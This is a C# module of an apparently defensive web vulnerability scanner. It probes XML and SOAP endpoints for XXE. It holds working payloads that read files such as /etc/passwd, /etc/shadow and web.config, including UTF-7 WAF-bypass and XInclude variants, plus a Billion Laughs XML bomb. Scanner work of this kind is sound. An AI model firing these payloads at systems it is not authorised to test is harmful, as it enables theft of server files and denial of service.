using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net.Http;
using System.Net.Http.Headers;
using System.Text;
using System.Threading.Tasks;
using Raqeeb.Domain.Entities;
using Raqeeb.Domain.Interfaces;
using Raqeeb.Domain.Scanning;

namespace Raqeeb.Infrastructure.Scanning.Modules;

/// <summary>
/// Detects XML External Entity (XXE) injection vulnerabilities.
/// Probes XML and SOAP endpoints with DTD-based payloads that attempt to
/// read well-known OS files, trigger DNS/HTTP out-of-band callbacks,
/// and detect billion-laughs (XML bomb) denial-of-service conditions.
/// Also tests whether JSON endpoints silently accept XML bodies.
/// </summary>
public class XxeScanner : IScannerModule
{
    public string Name => "XxeScanner";
    public string Description => "Detects XML External Entity (XXE) injection via DTD file-read, parameter entities, SOAP XXE, and XML bomb payloads.";

    // ?? Well-known files to exfiltrate and their response signatures ????????
    private static readonly (string FilePath, string[] Signatures, string Os)[] TargetFiles =
    [
        ("/etc/passwd",           ["root:", "daemon:", "/bin/bash", "/bin/sh", "nologin"],   "Linux"),
        ("/etc/hostname",         [],                                                         "Linux"),
        ("/etc/shadow",           ["root:", "$6$", "$y$"],                                    "Linux"),
        ("C:\\Windows\\win.ini",  ["[fonts]", "[extensions]", "[mci extensions]"],            "Windows"),
        ("C:\\Windows\\system.ini", ["[drivers]", "[386Enh]"],                                "Windows"),
        ("C:\\inetpub\\wwwroot\\web.config", ["<configuration", "connectionString"],          "Windows"),
    ];

    // ?? Canary string embedded in echo-style payloads ???????????????????????
    private const string Canary = "RAQEEB_XXE_CANARY_7f3a9c";

    // ?? Content-Types that signal XML processing ????????????????????????????
    private static readonly string[] XmlContentTypes =
    [
        "application/xml",
        "text/xml",
        "application/soap+xml",
        "application/xhtml+xml",
    ];

    // ?? Common endpoint paths that often accept XML ?????????????????????????
    private static readonly string[] XmlEndpointPaths =
    [
        "/api",
        "/api/upload",
        "/api/import",
        "/api/data",
        "/api/xml",
        "/api/parse",
        "/soap",
        "/ws",
        "/service",
        "/xmlrpc",
        "/webservice",
        "/upload",
        "/import",
    ];

    // ????????????????????????????????????????????????????????????????????????
    //  Payload builders
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// Classic DTD ENTITY XXE — reads a file and reflects it inside the
    /// root element text content.
    /// </summary>
    private static string BuildClassicXxePayload(string filePath)
    {
        return $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file://{filePath}">
            ]>
            <root>&xxe;</root>
            """;
    }

    /// <summary>
    /// Parameter-entity variant — uses %xxe; inside the DTD itself.
    /// Some parsers that block general entities still resolve parameter entities.
    /// </summary>
    private static string BuildParameterEntityPayload(string filePath)
    {
        return $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY % xxe SYSTEM "file://{filePath}">
              %xxe;
            ]>
            <root>test</root>
            """;
    }

    /// <summary>
    /// PHP-filter style (Base64 wrapper) — useful when the file contents
    /// break XML parsing (e.g., angle brackets in source code).
    /// Only works on PHP targets, but worth probing.
    /// </summary>
    private static string BuildPhpFilterPayload(string filePath)
    {
        return $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource={filePath}">
            ]>
            <root>&xxe;</root>
            """;
    }

    /// <summary>
    /// SOAP envelope wrapping a classic XXE in the body.
    /// </summary>
    private static string BuildSoapXxePayload(string filePath)
    {
        return $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE foo [
              <!ENTITY xxe SYSTEM "file://{filePath}">
            ]>
            <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"
                              xmlns:web="http://tempuri.org/">
              <soapenv:Header/>
              <soapenv:Body>
                <web:Request>
                  <web:Input>&xxe;</web:Input>
                </web:Request>
              </soapenv:Body>
            </soapenv:Envelope>
            """;
    }

    /// <summary>
    /// UTF-7 encoded XXE — bypasses WAFs/parsers that only filter UTF-8/16.
    /// </summary>
    private static string BuildUtf7XxePayload(string filePath)
    {
        return $"""
            <?xml version="1.0" encoding="UTF-7"?>
            +ADwAIQ-DOCTYPE foo +AFs-
              +ADwAIQ-ENTITY xxe SYSTEM +ACI-file://{filePath}+ACI-+AD4-
            +AF0APg-
            +ADw-root+AD4AJg-xxe+ADsAPA-/root+AD4-
            """;
    }

    /// <summary>
    /// XInclude payload — works when the attacker does not control the
    /// entire XML document but can inject into an element value.
    /// </summary>
    private static string BuildXIncludePayload(string filePath)
    {
        return $"""
            <foo xmlns:xi="http://www.w3.org/2001/XInclude">
              <xi:include parse="text" href="file://{filePath}"/>
            </foo>
            """;
    }

    /// <summary>
    /// Billion Laughs (XML bomb) — exponential entity expansion.
    /// We send a small version (10^5 expansions) and check whether the
    /// server responds slowly or crashes (timeout / 500).
    /// </summary>
    private static string BuildBillionLaughsPayload()
    {
        return """
            <?xml version="1.0" encoding="UTF-8"?>
            <!DOCTYPE lolz [
              <!ENTITY lol "lol">
              <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
              <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
              <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
              <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
            ]>
            <root>&lol5;</root>
            """;
    }

    /// <summary>
    /// Simple well-formed XML without any XXE — used as baseline.
    /// </summary>
    private static string BuildBenignXmlPayload()
    {
        return $"""
            <?xml version="1.0" encoding="UTF-8"?>
            <root>{Canary}</root>
            """;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Entry point
    // ????????????????????????????????????????????????????????????????????????

    public async Task<IEnumerable<Vulnerability>> ScanAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();

        try
        {
            var endpoints = DiscoverXmlEndpoints(context);

            // 1. Classic DTD file-read XXE
            var fileReadVulns = await DetectFileReadXxeAsync(context, endpoints);
            vulnerabilities.AddRange(fileReadVulns);

            // 2. SOAP-specific XXE
            var soapVulns = await DetectSoapXxeAsync(context, endpoints);
            vulnerabilities.AddRange(soapVulns);

            // 3. XInclude injection
            var xincludeVulns = await DetectXIncludeXxeAsync(context, endpoints);
            vulnerabilities.AddRange(xincludeVulns);

            // 4. Billion laughs / XML bomb DoS
            var dosVulns = await DetectBillionLaughsAsync(context, endpoints);
            vulnerabilities.AddRange(dosVulns);

            // 5. Content-Type smuggling — JSON endpoints that also accept XML
            var smuggleVulns = await DetectContentTypeSmugglingAsync(context);
            vulnerabilities.AddRange(smuggleVulns);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"XXE Scanner error: {ex.Message}");
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Endpoint discovery
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// Builds a list of candidate endpoints that are likely to accept XML.
    /// Sources: crawled URLs, well-known paths, and the target URL itself.
    /// </summary>
    private static List<string> DiscoverXmlEndpoints(ScanContext context)
    {
        var uri = new Uri(context.Target.Url);
        var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

        var endpoints = new HashSet<string>(StringComparer.OrdinalIgnoreCase)
        {
            context.Target.Url
        };

        // Add well-known XML/SOAP paths
        foreach (var path in XmlEndpointPaths)
        {
            endpoints.Add($"{baseAuthority}{path}");
        }

        // Add discovered URLs from the crawler
        foreach (var url in context.DiscoveredUrls)
        {
            endpoints.Add(url);
        }

        return endpoints.ToList();
    }

    // ????????????????????????????????????????????????????????????????????????
    //  1. Classic DTD file-read XXE
    // ????????????????????????????????????????????????????????????????????????

    private async Task<List<Vulnerability>> DetectFileReadXxeAsync(
        ScanContext context, List<string> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();
        var confirmedEndpoints = new HashSet<string>(StringComparer.OrdinalIgnoreCase);

        foreach (var endpoint in endpoints.Take(10))
        {
            if (confirmedEndpoints.Contains(endpoint)) continue;

            // First check: does this endpoint accept XML at all?
            if (!await AcceptsXmlAsync(context, endpoint)) continue;

            foreach (var (filePath, signatures, os) in TargetFiles.Take(4))
            {
                // ?? Classic ENTITY payload ??????????????????????????????
                var classicPayload = BuildClassicXxePayload(filePath);
                if (await TryXxePayloadAsync(context, endpoint, classicPayload,
                        signatures, filePath, os, "Classic DTD ENTITY") is { } v1)
                {
                    vulnerabilities.Add(v1);
                    confirmedEndpoints.Add(endpoint);
                    break;
                }

                // ?? Parameter entity payload ????????????????????????????
                var paramPayload = BuildParameterEntityPayload(filePath);
                if (await TryXxePayloadAsync(context, endpoint, paramPayload,
                        signatures, filePath, os, "Parameter Entity") is { } v2)
                {
                    vulnerabilities.Add(v2);
                    confirmedEndpoints.Add(endpoint);
                    break;
                }

                // ?? PHP filter payload (works only on PHP stacks) ???????
                var phpPayload = BuildPhpFilterPayload(filePath);
                if (await TryXxePayloadAsync(context, endpoint, phpPayload,
                        [], filePath, os, "PHP Filter Base64",
                        checkBase64: true) is { } v3)
                {
                    vulnerabilities.Add(v3);
                    confirmedEndpoints.Add(endpoint);
                    break;
                }

                // ?? UTF-7 encoded payload (WAF bypass) ??????????????????
                var utf7Payload = BuildUtf7XxePayload(filePath);
                if (await TryXxePayloadAsync(context, endpoint, utf7Payload,
                        signatures, filePath, os, "UTF-7 Encoding Bypass") is { } v4)
                {
                    vulnerabilities.Add(v4);
                    confirmedEndpoints.Add(endpoint);
                    break;
                }
            }
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  2. SOAP XXE
    // ????????????????????????????????????????????????????????????????????????

    private async Task<List<Vulnerability>> DetectSoapXxeAsync(
        ScanContext context, List<string> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        // Filter likely SOAP endpoints
        var soapEndpoints = endpoints
            .Where(e => e.Contains("soap", StringComparison.OrdinalIgnoreCase) ||
                        e.Contains("/ws", StringComparison.OrdinalIgnoreCase) ||
                        e.Contains("service", StringComparison.OrdinalIgnoreCase) ||
                        e.Contains(".asmx", StringComparison.OrdinalIgnoreCase) ||
                        e.Contains(".svc", StringComparison.OrdinalIgnoreCase))
            .Take(5)
            .ToList();

        foreach (var endpoint in soapEndpoints)
        {
            foreach (var (filePath, signatures, os) in TargetFiles.Take(2))
            {
                var soapPayload = BuildSoapXxePayload(filePath);
                var vuln = await TrySoapPayloadAsync(context, endpoint, soapPayload,
                    signatures, filePath, os);

                if (vuln != null)
                {
                    vulnerabilities.Add(vuln);
                    break; // One finding per endpoint
                }
            }
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  3. XInclude injection
    // ????????????????????????????????????????????????????????????????????????

    private async Task<List<Vulnerability>> DetectXIncludeXxeAsync(
        ScanContext context, List<string> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        foreach (var endpoint in endpoints.Take(5))
        {
            foreach (var (filePath, signatures, os) in TargetFiles.Take(2))
            {
                var xincPayload = BuildXIncludePayload(filePath);
                var vuln = await TryXxePayloadAsync(context, endpoint, xincPayload,
                    signatures, filePath, os, "XInclude");

                if (vuln != null)
                {
                    vuln.Name = "XML External Entity — XInclude Injection";
                    vuln.CweId = "CWE-611";
                    vulnerabilities.Add(vuln);
                    break;
                }
            }
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  4. Billion Laughs (XML bomb) DoS
    // ????????????????????????????????????????????????????????????????????????

    private async Task<List<Vulnerability>> DetectBillionLaughsAsync(
        ScanContext context, List<string> endpoints)
    {
        var vulnerabilities = new List<Vulnerability>();

        foreach (var endpoint in endpoints.Take(5))
        {
            if (!await AcceptsXmlAsync(context, endpoint)) continue;

            try
            {
                // Baseline timing with benign XML
                var benign = BuildBenignXmlPayload();
                var baselineSw = Stopwatch.StartNew();
                await PostXmlAsync(context, endpoint, benign);
                baselineSw.Stop();
                var baselineMs = baselineSw.ElapsedMilliseconds;

                // Now send the billion laughs payload
                var bomb = BuildBillionLaughsPayload();
                var bombSw = Stopwatch.StartNew();
                HttpResponseMessage? bombResponse = null;
                try
                {
                    bombResponse = await PostXmlAsync(context, endpoint, bomb);
                }
                catch (TaskCanceledException)
                {
                    // Timeout — strong indicator the server is expanding entities
                    bombSw.Stop();
                    vulnerabilities.Add(BuildBillionLaughsVuln(endpoint, baselineMs, bombSw.ElapsedMilliseconds, 0));
                    break;
                }
                catch (HttpRequestException)
                {
                    bombSw.Stop();
                    vulnerabilities.Add(BuildBillionLaughsVuln(endpoint, baselineMs, bombSw.ElapsedMilliseconds, 0));
                    break;
                }

                bombSw.Stop();

                // If the bomb response took significantly longer or returned 500
                var bombMs = bombSw.ElapsedMilliseconds;
                var statusCode = (int)(bombResponse?.StatusCode ?? 0);

                if (bombMs > baselineMs + 4000 || statusCode == 500 || statusCode == 503)
                {
                    vulnerabilities.Add(BuildBillionLaughsVuln(endpoint, baselineMs, bombMs, statusCode));
                    break;
                }
            }
            catch
            {
                // Continue
            }
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  5. Content-Type smuggling — JSON?XML
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// Some APIs check the Accept/Content-Type header but the underlying
    /// framework happily parses XML regardless. We send XXE payloads with
    /// Content-Type: application/xml to endpoints that normally serve JSON.
    /// </summary>
    private async Task<List<Vulnerability>> DetectContentTypeSmugglingAsync(ScanContext context)
    {
        var vulnerabilities = new List<Vulnerability>();
        var uri = new Uri(context.Target.Url);
        var baseAuthority = $"{uri.Scheme}://{uri.Authority}";

        // Collect endpoints that responded with JSON during crawling
        var jsonEndpoints = context.DiscoveredUrls
            .Where(u => u.Contains("/api", StringComparison.OrdinalIgnoreCase))
            .Take(5)
            .ToList();

        foreach (var endpoint in jsonEndpoints)
        {
            foreach (var (filePath, signatures, os) in TargetFiles.Take(2))
            {
                var payload = BuildClassicXxePayload(filePath);
                var vuln = await TryXxePayloadAsync(context, endpoint, payload,
                    signatures, filePath, os, "Content-Type Smuggling (JSON?XML)");

                if (vuln != null)
                {
                    vuln.Name = "XXE via Content-Type Smuggling";
                    vuln.Description = "The API endpoint normally serves JSON but also processes XML " +
                                       "request bodies. An attacker can exploit this to perform XXE " +
                                       "attacks by simply changing the Content-Type header to application/xml.";
                    vulnerabilities.Add(vuln);
                    break;
                }
            }
        }

        return vulnerabilities;
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Core probing helpers
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// POSTs an XXE payload and inspects the response for file-content signatures.
    /// </summary>
    private async Task<Vulnerability?> TryXxePayloadAsync(
        ScanContext context, string endpoint, string xmlPayload,
        string[] signatures, string targetFile, string os, string technique,
        bool checkBase64 = false)
    {
        try
        {
            var response = await PostXmlAsync(context, endpoint, xmlPayload);
            var content = await response.Content.ReadAsStringAsync();

            bool matched = false;
            string matchedSignature = string.Empty;

            // Check for plaintext file-content signatures
            if (signatures.Length > 0)
            {
                foreach (var sig in signatures)
                {
                    if (content.Contains(sig, StringComparison.OrdinalIgnoreCase))
                    {
                        matched = true;
                        matchedSignature = sig;
                        break;
                    }
                }
            }

            // Check for Base64-encoded file content (PHP filter payloads)
            if (!matched && checkBase64 && ContainsBase64FileContent(content))
            {
                matched = true;
                matchedSignature = "[Base64-encoded file content detected]";
            }

            // Check for XXE-related error messages that confirm entity processing
            if (!matched && ContainsXxeErrorIndicator(content))
            {
                matched = true;
                matchedSignature = "[XXE error indicator — entity processing confirmed]";
            }

            if (!matched) return null;

            var evidenceSnippet = ExtractEvidenceSnippet(content, matchedSignature, 400);

            return new Vulnerability
            {
                Name = $"XML External Entity Injection (XXE — {technique})",
                Description = $"The endpoint processes XML input with external entity resolution enabled. " +
                              $"Using the {technique} technique, the scanner was able to reference the " +
                              $"{os} system file '{targetFile}'. An attacker can read arbitrary server " +
                              $"files, perform SSRF, or cause denial of service.",
                Severity = Severity.Critical,
                Evidence = $"Endpoint: {endpoint}\nTechnique: {technique}\n" +
                           $"Target file: {targetFile} ({os})\n" +
                           $"Matched signature: {matchedSignature}\n" +
                           $"Response snippet:\n{evidenceSnippet}",
                Remediation = "Disable DTD processing and external entity resolution in the XML parser. " +
                              "In .NET: set XmlReaderSettings.DtdProcessing = DtdProcessing.Prohibit and " +
                              "XmlReaderSettings.XmlResolver = null. In Java: set " +
                              "XMLConstants.FEATURE_SECURE_PROCESSING. Use JSON instead of XML where possible.",
                Url = endpoint,
                HttpRequest = $"POST {endpoint} HTTP/1.1\nContent-Type: application/xml\n\n" +
                              TruncateForEvidence(xmlPayload, 500),
                HttpResponse = $"HTTP/1.1 {(int)response.StatusCode}\n{evidenceSnippet}",
                ModuleName = Name,
                OwaspCategory = "A05:2021 - Security Misconfiguration",
                CweId = "CWE-611",
                CvssScore = "9.1",
                References = "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/," +
                             "https://cwe.mitre.org/data/definitions/611.html," +
                             "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html," +
                             "https://portswigger.net/web-security/xxe"
            };
        }
        catch
        {
            return null;
        }
    }

    /// <summary>
    /// POSTs a SOAP XXE payload with the appropriate SOAP Content-Type.
    /// </summary>
    private async Task<Vulnerability?> TrySoapPayloadAsync(
        ScanContext context, string endpoint, string soapPayload,
        string[] signatures, string targetFile, string os)
    {
        try
        {
            var httpContent = new StringContent(soapPayload, Encoding.UTF8);
            httpContent.Headers.ContentType = new MediaTypeHeaderValue("text/xml");
            httpContent.Headers.Add("SOAPAction", "\"\"");

            var response = await context.HttpClient.PostAsync(endpoint, httpContent);
            var content = await response.Content.ReadAsStringAsync();

            bool matched = false;
            string matchedSignature = string.Empty;

            foreach (var sig in signatures)
            {
                if (content.Contains(sig, StringComparison.OrdinalIgnoreCase))
                {
                    matched = true;
                    matchedSignature = sig;
                    break;
                }
            }

            if (!matched && ContainsXxeErrorIndicator(content))
            {
                matched = true;
                matchedSignature = "[XXE error indicator in SOAP response]";
            }

            if (!matched) return null;

            var evidenceSnippet = ExtractEvidenceSnippet(content, matchedSignature, 400);

            return new Vulnerability
            {
                Name = "XML External Entity Injection (XXE — SOAP Endpoint)",
                Description = $"The SOAP endpoint processes XML with external entity resolution enabled. " +
                              $"The scanner injected a DTD referencing the {os} file '{targetFile}' " +
                              $"inside a SOAP envelope body and detected file content in the response.",
                Severity = Severity.Critical,
                Evidence = $"Endpoint: {endpoint}\nTechnique: SOAP Envelope XXE\n" +
                           $"Target file: {targetFile} ({os})\n" +
                           $"Matched: {matchedSignature}\n" +
                           $"Response snippet:\n{evidenceSnippet}",
                Remediation = "Disable DTD processing on the SOAP/WCF/ASMX service. In .NET WCF: use " +
                              "XmlDictionaryReaderQuotas with MaxDepth constraints and disable entity " +
                              "expansion. Migrate from legacy ASMX to modern WCF/gRPC where possible.",
                Url = endpoint,
                HttpRequest = $"POST {endpoint} HTTP/1.1\nContent-Type: text/xml\nSOAPAction: \"\"\n\n" +
                              TruncateForEvidence(soapPayload, 500),
                HttpResponse = $"HTTP/1.1 {(int)response.StatusCode}\n{evidenceSnippet}",
                ModuleName = Name,
                OwaspCategory = "A05:2021 - Security Misconfiguration",
                CweId = "CWE-611",
                CvssScore = "9.1",
                References = "https://cwe.mitre.org/data/definitions/611.html," +
                             "https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html"
            };
        }
        catch
        {
            return null;
        }
    }

    // ????????????????????????????????????????????????????????????????????????
    //  HTTP helpers
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// POSTs XML content to an endpoint, trying multiple Content-Types to
    /// maximise the chance the server will parse it.
    /// </summary>
    private static async Task<HttpResponseMessage> PostXmlAsync(
        ScanContext context, string endpoint, string xmlPayload)
    {
        var httpContent = new StringContent(xmlPayload, Encoding.UTF8);
        httpContent.Headers.ContentType = new MediaTypeHeaderValue("application/xml");
        return await context.HttpClient.PostAsync(endpoint, httpContent);
    }

    /// <summary>
    /// Quick probe — sends a benign XML body and returns true if the server
    /// responds with something other than 405 Method Not Allowed / 415
    /// Unsupported Media Type.
    /// </summary>
    private static async Task<bool> AcceptsXmlAsync(ScanContext context, string endpoint)
    {
        try
        {
            var benign = BuildBenignXmlPayload();
            var response = await PostXmlAsync(context, endpoint, benign);
            var code = (int)response.StatusCode;

            // 405 / 415 / 501 mean the endpoint definitely does not accept XML POSTs
            return code != 405 && code != 415 && code != 501;
        }
        catch
        {
            return false;
        }
    }

    // ????????????????????????????????????????????????????????????????????????
    //  Detection helpers
    // ????????????????????????????????????????????????????????????????????????

    /// <summary>
    /// Checks whether the response body contains error messages that prove
    /// the XML parser attempted to resolve an external entity (even if it
    /// failed).  These are strong indicators of a potential XXE.
    /// </summary>
    private static bool ContainsXxeErrorIndicator(string content)
    {
        string[] indicators =
        [
            "SYSTEM \"file://",
            "failed to load external entity",
            "External entity",
            "entity reference",
            "DOCTYPE",
            "disallowed doctype",
            "DtdProcessing",
            "DTD is prohibited",
            "entity expansion",
            "xml parsing error",
            "not allowed in prolog",
            "Undeclared general entity",
            "operation is not allowed",
            "xmlParseEntityRef",
            "org.xml.sax.SAXParseException",
            "javax.xml.bind",
            "System.Xml.XmlException",
        ];

        foreach (var indicator in indicators)
        {
            if (content.Contains(indicator, StringComparison.OrdinalIgnoreCase))
                return true;
        }

        return false;
    }

    /// <summary>
    /// A heuristic check for Base64-encoded file content in the response.
    /// Looks for long Base64 strings (? 60 chars) that are not typical of
    /// normal API responses.
    /// </summary>
    private static bool ContainsBase64FileContent(string content)
    {
        // Base64 /etc/passwd starts with "cm9vd" (base64 of "root:")
        if (content.Contains("cm9vd", StringComparison.Ordinal))
            return true;

        // Base64 [fonts] (win.ini) starts with "W2ZvbnRz"
        if (content.Contains("W2ZvbnRz", StringComparison.Ordinal))
            return true;

        // Generic: a long block of base64 characters not normally present
        // in structured responses. We look for 100+ contiguous base64 chars.
        for (int i = 0; i < content.Length - 100; i++)
        {
            if (IsBase64Char(content[i]))
            {
                int run = 0;
                while (i + run < content.Length && IsBase64Char(content[i + run]))
                    run++;
                if (run >= 100)
                    return true;
                i += run;
            }
        }

        return false;
    }

    private static bool IsBase64Char(char c) =>
        char.IsLetterOrDigit(c) || c == '+' || c == '/' || c == '=';

    private static Vulnerability BuildBillionLaughsVuln(
        string endpoint, long baselineMs, long bombMs, int statusCode)
    {
        return new Vulnerability
        {
            Name = "XML Bomb — Billion Laughs Denial of Service",
            Description = "The endpoint is vulnerable to an XML entity-expansion denial-of-service " +
                          "attack (Billion Laughs). The server attempted to recursively expand nested " +
                          "entities, causing excessive memory consumption and a significant response delay " +
                          "or crash.",
            Severity = Severity.High,
            Evidence = $"Endpoint: {endpoint}\n" +
                       $"Baseline response time: {baselineMs}ms\n" +
                       $"XML bomb response time: {bombMs}ms\n" +
                       $"HTTP Status: {(statusCode > 0 ? statusCode.ToString() : "Timeout/Connection Reset")}",
            Remediation = "Disable DTD processing entirely. In .NET: set DtdProcessing.Prohibit. " +
                          "Configure XML parser limits (MaxCharactersFromEntities, MaxDepth). " +
                          "Use XmlReader with restrictive XmlReaderSettings.",
            Url = endpoint,
            HttpRequest = "POST " + endpoint + " HTTP/1.1\nContent-Type: application/xml\n\n[Billion Laughs payload]",
            HttpResponse = $"HTTP/1.1 {(statusCode > 0 ? statusCode.ToString() : "Timeout")}\nResponse time: {bombMs}ms",
            ModuleName = "XxeScanner",
            OwaspCategory = "A05:2021 - Security Misconfiguration",
            CweId = "CWE-776",
            CvssScore = "7.5",
            References = "https://cwe.mitre.org/data/definitions/776.html," +
                         "https://en.wikipedia.org/wiki/Billion_laughs_attack"
        };
    }

    // ????????????????????????????????????????????????????????????????????????
    //  String helpers
    // ????????????????????????????????????????????????????????????????????????

    private static string ExtractEvidenceSnippet(string content, string marker, int maxLength)
    {
        if (string.IsNullOrEmpty(content))
            return string.Empty;

        if (string.IsNullOrEmpty(marker))
            return content.Length > maxLength ? content[..maxLength] + "…" : content;

        var idx = content.IndexOf(marker, StringComparison.OrdinalIgnoreCase);
        if (idx < 0)
            return content.Length > maxLength ? content[..maxLength] + "…" : content;

        var start = Math.Max(0, idx - 80);
        var end = Math.Min(content.Length, idx + marker.Length + 80);
        var snippet = content[start..end];

        return snippet.Length > maxLength ? snippet[..maxLength] + "…" : snippet;
    }

    private static string TruncateForEvidence(string text, int maxLength) =>
        text.Length > maxLength ? text[..maxLength] + "…" : text;
}
